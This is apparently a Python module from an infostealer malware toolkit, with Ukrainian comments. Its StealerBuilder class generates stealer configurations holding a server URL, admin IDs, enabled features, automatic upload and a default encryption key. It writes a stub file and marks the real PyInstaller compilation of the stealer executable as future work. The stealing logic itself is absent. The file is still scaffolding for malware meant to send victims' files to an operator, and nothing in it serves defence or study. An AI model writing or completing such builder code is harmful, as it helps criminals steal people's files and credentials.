import logging
import os
import json
from typing import Dict, Any

logger = logging.getLogger(__name__)

class StealerBuilder:
    """Builder for stealer clients"""
    
    def __init__(self):
        logger.info("StealerBuilder initialized")
    
    def build_stealer(self, config: Dict[str, Any], output_path: str) -> bool:
        """Build stealer executable with given configuration"""
        try:
            # Створюємо папку для виводу, якщо не існує
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            
            # Генеруємо конфігураційний файл
            config_file = output_path.replace('.exe', '_config.json')
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=2, ensure_ascii=False)
            
            logger.info(f"Building stealer to: {output_path}")
            logger.info(f"Configuration: {config}")
            logger.info(f"Files will be sent to admin: {config.get('target_admin', 'Unknown')}")
            
            # Тут буде виклик PyInstaller для компіляції
            # Наразі просто створюємо заглушку
            self._create_stub_exe(output_path, config)
            
            logger.info(f"Stealer built successfully for admin {config.get('target_admin')}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to build stealer: {e}")
            return False
    
    def _create_stub_exe(self, output_path: str, config: Dict[str, Any]):
        """Створюємо заглушку .exe файлу (тимчасово)"""
        stub_content = f"""# Stealer Configuration
# Target Admin: {config.get('target_admin')}
# Admin ID: {config.get('admin_id')}
# Features: {', '.join(config.get('features', []))}
# Server URL: {config.get('server_url')}

print("Stealer would send files to admin: {config.get('target_admin')}")
"""
        
        with open(output_path.replace('.exe', '.py'), 'w', encoding='utf-8') as f:
            f.write(stub_content)
        
        # В майбутньому тут буде виклик PyInstaller
        logger.info(f"Created stub for: {output_path}")
    
    def generate_config(self, server_url: str, features: Dict[str, bool], admin_id: str, target_admin: str) -> Dict[str, Any]:
        """Generate configuration for stealer"""
        config = {
            "server_url": server_url,
            "admin_id": admin_id,
            "target_admin": target_admin,
            "features": [k for k, v in features.items() if v],
            "version": "1.0.0",
            "auto_upload": True,
            "encryption_key": "default-key-change-in-production"
        }
        return config

# Global instance
stealer_builder = StealerBuilder()